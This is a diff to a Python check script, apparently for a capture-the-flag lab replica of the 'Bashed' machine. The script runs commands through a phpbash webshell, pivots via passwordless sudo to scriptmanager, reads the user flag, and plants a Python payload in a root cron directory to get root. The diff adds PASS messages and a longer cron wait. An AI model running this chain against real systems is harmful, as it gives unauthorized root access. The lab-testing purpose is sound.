@@ -15,18 +15,24 @@ def cmd(command):
         return response.read().decode("utf-8", errors="replace")
 
 home = urllib.request.urlopen(BASE + "/", timeout=8).read().decode()
+print("PASS: public landing page")
 assert "Bashed" in home
 page = urllib.request.urlopen(BASE + "/dev/phpbash.php", timeout=8).read().decode()
 assert "phpbash" in page.lower() and "sendCommand" in page, "Original Arrexel webshell missing"
+print("PASS: original Arrexel/phpbash discovered")
 
 identity = cmd("whoami; id")
 assert "www-data" in identity and "uid=33(www-data)" in identity, identity[:400]
+print("PASS: PHP shell executes as www-data")
 sudo = cmd("sudo -l")
 assert "scriptmanager" in sudo and "NOPASSWD" in sudo, sudo[:500]
+print("PASS: sudo pivot to scriptmanager")
 scriptmanager = cmd("sudo -u scriptmanager id")
 assert "uid=1001(scriptmanager)" in scriptmanager, scriptmanager[:300]
+print("PASS: scriptmanager execution")
 user_flag = cmd("cat /home/arrexel/user.txt")
 assert "TTP{bashed_ci_private_user" in user_flag, "User flag missing"
+print("PASS: user flag permission")
 
 payload = (
     "import os\n"
@@ -39,9 +45,9 @@ assert "error" not in write.lower(), write[:300]
 
 # The real root cron executes all *.py files in /scripts once per minute.
 # Wait for a genuine cron invocation instead of calling the script ourselves.
-deadline = time.time() + 70
+deadline = time.time() + 125
 while time.time() < deadline:
-    result = cmd("test -s /tmp/bashed-root-proof && cat /tmp/bashed-root-proof; test -s /tmp/bashed-root-flag-proof && cat /tmp/bashed-root-flag-proof")
+    result = cmd("cat /tmp/bashed-cron-runs 2>/dev/null; test -s /tmp/bashed-root-proof && cat /tmp/bashed-root-proof; test -s /tmp/bashed-root-flag-proof && cat /tmp/bashed-root-flag-proof")
     if "uid=0(root)" in result and "TTP{bashed_ci_private_root" in result:
         print("PASS: phpbash www-data -> sudo scriptmanager -> writable real cron script -> root")
         break
